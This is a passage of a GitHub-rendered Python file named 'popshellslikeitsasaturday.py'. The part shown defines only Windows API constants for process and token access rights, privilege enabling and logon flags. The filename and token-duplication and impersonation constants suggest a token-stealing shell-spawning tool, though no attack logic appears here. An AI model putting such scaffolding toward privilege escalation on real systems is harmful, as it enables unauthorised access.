        <td id="file-popshellslikeitsasaturday-py-LC98" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>hThread<span class="pl-pds">&#39;</span></span>,     <span class="pl-c1">HANDLE</span>),                        <span class="pl-c"><span class="pl-c">#</span> HANDLE hThread;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L99" class="blob-num js-line-number" data-line-number="99"></td>
        <td id="file-popshellslikeitsasaturday-py-LC99" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwProcessId<span class="pl-pds">&#39;</span></span>,  <span class="pl-c1">DWORD</span>),                        <span class="pl-c"><span class="pl-c">#</span> DWORD  dwProcessId;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L100" class="blob-num js-line-number" data-line-number="100"></td>
        <td id="file-popshellslikeitsasaturday-py-LC100" class="blob-code blob-code-inner js-file-line">               (<span class="pl-s"><span class="pl-pds">&#39;</span>dwThreadId<span class="pl-pds">&#39;</span></span>,   <span class="pl-c1">DWORD</span>)                         <span class="pl-c"><span class="pl-c">#</span> DWORD  dwThreadId;</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L101" class="blob-num js-line-number" data-line-number="101"></td>
        <td id="file-popshellslikeitsasaturday-py-LC101" class="blob-code blob-code-inner js-file-line">               ]                                               <span class="pl-c"><span class="pl-c">#</span> }</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L102" class="blob-num js-line-number" data-line-number="102"></td>
        <td id="file-popshellslikeitsasaturday-py-LC102" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L103" class="blob-num js-line-number" data-line-number="103"></td>
        <td id="file-popshellslikeitsasaturday-py-LC103" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> A pointer to a TOKEN_PRIVILEGES structure that specifies an array of privileges and their attributes.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L104" class="blob-num js-line-number" data-line-number="104"></td>
        <td id="file-popshellslikeitsasaturday-py-LC104" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> NewState [in, optional]                       #  https://msdn.microsoft.com/en-us/library/windows/desktop/aa375202(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L105" class="blob-num js-line-number" data-line-number="105"></td>
        <td id="file-popshellslikeitsasaturday-py-LC105" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">SE_PRIVILEGE_ENABLED</span>            <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00000002</span> <span class="pl-c"><span class="pl-c">#</span> The function enables the privilege</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L106" class="blob-num js-line-number" data-line-number="106"></td>
        <td id="file-popshellslikeitsasaturday-py-LC106" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L107" class="blob-num js-line-number" data-line-number="107"></td>
        <td id="file-popshellslikeitsasaturday-py-LC107" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Process creation flags | https://msdn.microsoft.com/en-us/library/windows/desktop/ms684863(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L108" class="blob-num js-line-number" data-line-number="108"></td>
        <td id="file-popshellslikeitsasaturday-py-LC108" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">CREATE_NEW_CONSOLE</span>              <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00000010</span> <span class="pl-c"><span class="pl-c">#</span> The new process has a new console, instead of inheriting its parent&#39;s console (the default).</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L109" class="blob-num js-line-number" data-line-number="109"></td>
        <td id="file-popshellslikeitsasaturday-py-LC109" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L110" class="blob-num js-line-number" data-line-number="110"></td>
        <td id="file-popshellslikeitsasaturday-py-LC110" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Maximum Path Length Limitation | https://msdn.microsoft.com/en-us/library/windows/desktop/aa365247(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L111" class="blob-num js-line-number" data-line-number="111"></td>
        <td id="file-popshellslikeitsasaturday-py-LC111" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">MAX_PATH</span>                        <span class="pl-k">=</span> <span class="pl-c1">260</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L112" class="blob-num js-line-number" data-line-number="112"></td>
        <td id="file-popshellslikeitsasaturday-py-LC112" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L113" class="blob-num js-line-number" data-line-number="113"></td>
        <td id="file-popshellslikeitsasaturday-py-LC113" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> dwLogonFlags [in]</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L114" class="blob-num js-line-number" data-line-number="114"></td>
        <td id="file-popshellslikeitsasaturday-py-LC114" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">LOGON_NETCREDENTIALS_ONLY</span>       <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00000002</span> <span class="pl-c"><span class="pl-c">#</span> Log on, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials.                    lpApplicationName = CMDPath.value</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L115" class="blob-num js-line-number" data-line-number="115"></td>
        <td id="file-popshellslikeitsasaturday-py-LC115" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L116" class="blob-num js-line-number" data-line-number="116"></td>
        <td id="file-popshellslikeitsasaturday-py-LC116" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Standard access rights | https://msdn.microsoft.com/en-us/library/windows/desktop/aa379607(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L117" class="blob-num js-line-number" data-line-number="117"></td>
        <td id="file-popshellslikeitsasaturday-py-LC117" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">SYNCHRONIZE</span>                     <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00100000</span>   <span class="pl-c"><span class="pl-c">#</span> The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L118" class="blob-num js-line-number" data-line-number="118"></td>
        <td id="file-popshellslikeitsasaturday-py-LC118" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">DELETE</span>                          <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00010000</span>   <span class="pl-c"><span class="pl-c">#</span> The right to delete the object</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L119" class="blob-num js-line-number" data-line-number="119"></td>
        <td id="file-popshellslikeitsasaturday-py-LC119" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">READ_CONTROL</span>                    <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00020000</span>   <span class="pl-c"><span class="pl-c">#</span> The right to read the information in the object&#39;s security descriptor, not including the information in the system access control list (SACL). To read or write the SACL, you must request the ACCESS_SYSTEM_SECURITY access right.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L120" class="blob-num js-line-number" data-line-number="120"></td>
        <td id="file-popshellslikeitsasaturday-py-LC120" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">WRITE_DAC</span>                       <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00040000</span>   <span class="pl-c"><span class="pl-c">#</span> Required to modify the DACL in the security descriptor for the object.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L121" class="blob-num js-line-number" data-line-number="121"></td>
        <td id="file-popshellslikeitsasaturday-py-LC121" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">WRITE_OWNER</span>                     <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00080000</span>   <span class="pl-c"><span class="pl-c">#</span> Required to change the owner in the security descriptor for the object.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L122" class="blob-num js-line-number" data-line-number="122"></td>
        <td id="file-popshellslikeitsasaturday-py-LC122" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">STANDARD_RIGHTS_READ</span>            <span class="pl-k">=</span> <span class="pl-c1">READ_CONTROL</span> <span class="pl-c"><span class="pl-c">#</span> Currently defined to equal READ_CONTROL</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L123" class="blob-num js-line-number" data-line-number="123"></td>
        <td id="file-popshellslikeitsasaturday-py-LC123" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">STANDARD_RIGHTS_WRITE</span>           <span class="pl-k">=</span> <span class="pl-c1">READ_CONTROL</span> <span class="pl-c"><span class="pl-c">#</span> Currently defined to equal READ_CONTROL</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L124" class="blob-num js-line-number" data-line-number="124"></td>
        <td id="file-popshellslikeitsasaturday-py-LC124" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">STANDARD_RIGHTS_REQUIRED</span>        <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>000F0000</span>   <span class="pl-c"><span class="pl-c">#</span> Combines DELETE, READ_CONTROL, WRITE_DAC, and WRITE_OWNER access</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L125" class="blob-num js-line-number" data-line-number="125"></td>
        <td id="file-popshellslikeitsasaturday-py-LC125" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L126" class="blob-num js-line-number" data-line-number="126"></td>
        <td id="file-popshellslikeitsasaturday-py-LC126" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Process access rights for OpenProcess # https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L127" class="blob-num js-line-number" data-line-number="127"></td>
        <td id="file-popshellslikeitsasaturday-py-LC127" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_CREATE_PROCESS</span>           <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0080</span> <span class="pl-c"><span class="pl-c">#</span> Required to create a process.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L128" class="blob-num js-line-number" data-line-number="128"></td>
        <td id="file-popshellslikeitsasaturday-py-LC128" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_CREATE_THREAD</span>            <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0002</span> <span class="pl-c"><span class="pl-c">#</span> Required to create a thread.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L129" class="blob-num js-line-number" data-line-number="129"></td>
        <td id="file-popshellslikeitsasaturday-py-LC129" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_DUP_HANDLE</span>               <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0040</span> <span class="pl-c"><span class="pl-c">#</span> Required to duplicate a handle using DuplicateHandle.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L130" class="blob-num js-line-number" data-line-number="130"></td>
        <td id="file-popshellslikeitsasaturday-py-LC130" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_QUERY_INFORMATION</span>        <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0400</span> <span class="pl-c"><span class="pl-c">#</span> Required to retrieve certain information about a process, such as its token, exit code, and priority class = see OpenProcessToken #.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L131" class="blob-num js-line-number" data-line-number="131"></td>
        <td id="file-popshellslikeitsasaturday-py-LC131" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_QUERY_LIMITED_INFORMATION</span><span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>1000</span> <span class="pl-c"><span class="pl-c">#</span> Required to retrieve certain information about a process = see GetExitCodeProcess, GetPriorityClass, IsProcessInJob, QueryFullProcessImageName #. A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.  Windows Server 2003 and Windows XP:  This access right is not supported.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L132" class="blob-num js-line-number" data-line-number="132"></td>
        <td id="file-popshellslikeitsasaturday-py-LC132" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_SET_INFORMATION</span>          <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0200</span> <span class="pl-c"><span class="pl-c">#</span> Required to set certain information about a process, such as its priority class = see SetPriorityClass #.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L133" class="blob-num js-line-number" data-line-number="133"></td>
        <td id="file-popshellslikeitsasaturday-py-LC133" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_SET_QUOTA</span>                <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0100</span> <span class="pl-c"><span class="pl-c">#</span> Required to set memory limits using SetProcessWorkingSetSize.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L134" class="blob-num js-line-number" data-line-number="134"></td>
        <td id="file-popshellslikeitsasaturday-py-LC134" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_SUSPEND_RESUME</span>           <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0800</span> <span class="pl-c"><span class="pl-c">#</span> Required to suspend or resume a process.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L135" class="blob-num js-line-number" data-line-number="135"></td>
        <td id="file-popshellslikeitsasaturday-py-LC135" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_TERMINATE</span>                <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0001</span> <span class="pl-c"><span class="pl-c">#</span> Required to terminate a process using TerminateProcess.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L136" class="blob-num js-line-number" data-line-number="136"></td>
        <td id="file-popshellslikeitsasaturday-py-LC136" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_VM_OPERATION</span>             <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0008</span> <span class="pl-c"><span class="pl-c">#</span> Required to perform an operation on the address space of a process = see VirtualProtectEx and WriteProcessMemory #.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L137" class="blob-num js-line-number" data-line-number="137"></td>
        <td id="file-popshellslikeitsasaturday-py-LC137" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_VM_READ</span>                  <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0010</span> <span class="pl-c"><span class="pl-c">#</span> Required to read memory in a process using ReadProcessMemory.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L138" class="blob-num js-line-number" data-line-number="138"></td>
        <td id="file-popshellslikeitsasaturday-py-LC138" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_VM_WRITE</span>                 <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0020</span> <span class="pl-c"><span class="pl-c">#</span> Required to write to memory in a process using WriteProcessMemory.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L139" class="blob-num js-line-number" data-line-number="139"></td>
        <td id="file-popshellslikeitsasaturday-py-LC139" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PROCESS_ALL_ACCESS</span>               <span class="pl-k">=</span> (<span class="pl-c1">PROCESS_CREATE_PROCESS</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L140" class="blob-num js-line-number" data-line-number="140"></td>
        <td id="file-popshellslikeitsasaturday-py-LC140" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_CREATE_THREAD</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L141" class="blob-num js-line-number" data-line-number="141"></td>
        <td id="file-popshellslikeitsasaturday-py-LC141" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_DUP_HANDLE</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L142" class="blob-num js-line-number" data-line-number="142"></td>
        <td id="file-popshellslikeitsasaturday-py-LC142" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_QUERY_INFORMATION</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L143" class="blob-num js-line-number" data-line-number="143"></td>
        <td id="file-popshellslikeitsasaturday-py-LC143" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_QUERY_LIMITED_INFORMATION</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L144" class="blob-num js-line-number" data-line-number="144"></td>
        <td id="file-popshellslikeitsasaturday-py-LC144" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_SET_INFORMATION</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L145" class="blob-num js-line-number" data-line-number="145"></td>
        <td id="file-popshellslikeitsasaturday-py-LC145" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_SET_QUOTA</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L146" class="blob-num js-line-number" data-line-number="146"></td>
        <td id="file-popshellslikeitsasaturday-py-LC146" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_SUSPEND_RESUME</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L147" class="blob-num js-line-number" data-line-number="147"></td>
        <td id="file-popshellslikeitsasaturday-py-LC147" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_TERMINATE</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L148" class="blob-num js-line-number" data-line-number="148"></td>
        <td id="file-popshellslikeitsasaturday-py-LC148" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_VM_OPERATION</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L149" class="blob-num js-line-number" data-line-number="149"></td>
        <td id="file-popshellslikeitsasaturday-py-LC149" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_VM_READ</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L150" class="blob-num js-line-number" data-line-number="150"></td>
        <td id="file-popshellslikeitsasaturday-py-LC150" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">PROCESS_VM_WRITE</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L151" class="blob-num js-line-number" data-line-number="151"></td>
        <td id="file-popshellslikeitsasaturday-py-LC151" class="blob-code blob-code-inner js-file-line">                                  <span class="pl-k">|</span> <span class="pl-c1">SYNCHRONIZE</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L152" class="blob-num js-line-number" data-line-number="152"></td>
        <td id="file-popshellslikeitsasaturday-py-LC152" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L153" class="blob-num js-line-number" data-line-number="153"></td>
        <td id="file-popshellslikeitsasaturday-py-LC153" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Token access rights | https://msdn.microsoft.com/en-us/library/windows/desktop/aa374905(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L154" class="blob-num js-line-number" data-line-number="154"></td>
        <td id="file-popshellslikeitsasaturday-py-LC154" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_ADJUST_PRIVILEGES</span>         <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00000020</span>   <span class="pl-c"><span class="pl-c">#</span> Required to enable or disable the privileges in an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L155" class="blob-num js-line-number" data-line-number="155"></td>
        <td id="file-popshellslikeitsasaturday-py-LC155" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_QUERY</span>                     <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>00000008</span>   <span class="pl-c"><span class="pl-c">#</span> Required to query an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L156" class="blob-num js-line-number" data-line-number="156"></td>
        <td id="file-popshellslikeitsasaturday-py-LC156" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_ASSIGN_PRIMARY</span>            <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0001</span>       <span class="pl-c"><span class="pl-c">#</span> Required to attach a primary token to a process. The SE_ASSIGNPRIMARYTOKEN_NAME privilege is also required to accomplish this task</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L157" class="blob-num js-line-number" data-line-number="157"></td>
        <td id="file-popshellslikeitsasaturday-py-LC157" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_DUPLICATE</span>                 <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0002</span>       <span class="pl-c"><span class="pl-c">#</span> Required to duplicate an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L158" class="blob-num js-line-number" data-line-number="158"></td>
        <td id="file-popshellslikeitsasaturday-py-LC158" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_IMPERSONATE</span>               <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0004</span>       <span class="pl-c"><span class="pl-c">#</span> Required to attach an impersonation access token to a process</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L159" class="blob-num js-line-number" data-line-number="159"></td>
        <td id="file-popshellslikeitsasaturday-py-LC159" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_QUERY_SOURCE</span>              <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0010</span>       <span class="pl-c"><span class="pl-c">#</span> Required to query the source of an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L160" class="blob-num js-line-number" data-line-number="160"></td>
        <td id="file-popshellslikeitsasaturday-py-LC160" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_ADJUST_GROUPS</span>             <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0040</span>       <span class="pl-c"><span class="pl-c">#</span> Required to adjust the attributes of the groups in an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L161" class="blob-num js-line-number" data-line-number="161"></td>
        <td id="file-popshellslikeitsasaturday-py-LC161" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_ADJUST_DEFAULT</span>            <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0080</span>       <span class="pl-c"><span class="pl-c">#</span> Required to change the default owner, primary group, or DACL of an access token</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L162" class="blob-num js-line-number" data-line-number="162"></td>
        <td id="file-popshellslikeitsasaturday-py-LC162" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_ADJUST_SESSIONID</span>          <span class="pl-k">=</span> <span class="pl-c1"><span class="pl-k">0x</span>0100</span>       <span class="pl-c"><span class="pl-c">#</span> Required to adjust the session ID of an access token. The SE_TCB_NAME privilege is required</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L163" class="blob-num js-line-number" data-line-number="163"></td>
        <td id="file-popshellslikeitsasaturday-py-LC163" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_READ</span>                      <span class="pl-k">=</span> (<span class="pl-c1">STANDARD_RIGHTS_READ</span> <span class="pl-k">|</span> <span class="pl-c1">TOKEN_QUERY</span>)               <span class="pl-c"><span class="pl-c">#</span> Combines STANDARD_RIGHTS_READ and TOKEN_QUERY.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L164" class="blob-num js-line-number" data-line-number="164"></td>
        <td id="file-popshellslikeitsasaturday-py-LC164" class="blob-code blob-code-inner js-file-line">tokenprivs <span class="pl-k">=</span> (<span class="pl-c1">TOKEN_QUERY</span> <span class="pl-k">|</span> <span class="pl-c1">TOKEN_READ</span> <span class="pl-k">|</span> <span class="pl-c1">TOKEN_IMPERSONATE</span> <span class="pl-k">|</span> <span class="pl-c1">TOKEN_QUERY_SOURCE</span> <span class="pl-k">|</span> <span class="pl-c1">TOKEN_DUPLICATE</span> <span class="pl-k">|</span> <span class="pl-c1">TOKEN_ASSIGN_PRIMARY</span> <span class="pl-k">|</span> (<span class="pl-c1">131072<span class="pl-k">L</span></span> <span class="pl-k">|</span> <span class="pl-c1">4</span>))</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L165" class="blob-num js-line-number" data-line-number="165"></td>
        <td id="file-popshellslikeitsasaturday-py-LC165" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">TOKEN_ALL_ACCESS</span>                <span class="pl-k">=</span> (<span class="pl-c1">STANDARD_RIGHTS_REQUIRED</span>                          <span class="pl-c"><span class="pl-c">#</span> Combines all possible access rights for a token.</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L166" class="blob-num js-line-number" data-line-number="166"></td>
        <td id="file-popshellslikeitsasaturday-py-LC166" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_ASSIGN_PRIMARY</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L167" class="blob-num js-line-number" data-line-number="167"></td>
        <td id="file-popshellslikeitsasaturday-py-LC167" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_DUPLICATE</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L168" class="blob-num js-line-number" data-line-number="168"></td>
        <td id="file-popshellslikeitsasaturday-py-LC168" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_IMPERSONATE</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L169" class="blob-num js-line-number" data-line-number="169"></td>
        <td id="file-popshellslikeitsasaturday-py-LC169" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_QUERY</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L170" class="blob-num js-line-number" data-line-number="170"></td>
        <td id="file-popshellslikeitsasaturday-py-LC170" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_QUERY_SOURCE</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L171" class="blob-num js-line-number" data-line-number="171"></td>
        <td id="file-popshellslikeitsasaturday-py-LC171" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_ADJUST_PRIVILEGES</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L172" class="blob-num js-line-number" data-line-number="172"></td>
        <td id="file-popshellslikeitsasaturday-py-LC172" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_ADJUST_GROUPS</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L173" class="blob-num js-line-number" data-line-number="173"></td>
        <td id="file-popshellslikeitsasaturday-py-LC173" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_ADJUST_DEFAULT</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L174" class="blob-num js-line-number" data-line-number="174"></td>
        <td id="file-popshellslikeitsasaturday-py-LC174" class="blob-code blob-code-inner js-file-line">                                 <span class="pl-k">|</span> <span class="pl-c1">TOKEN_ADJUST_SESSIONID</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L175" class="blob-num js-line-number" data-line-number="175"></td>
        <td id="file-popshellslikeitsasaturday-py-LC175" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
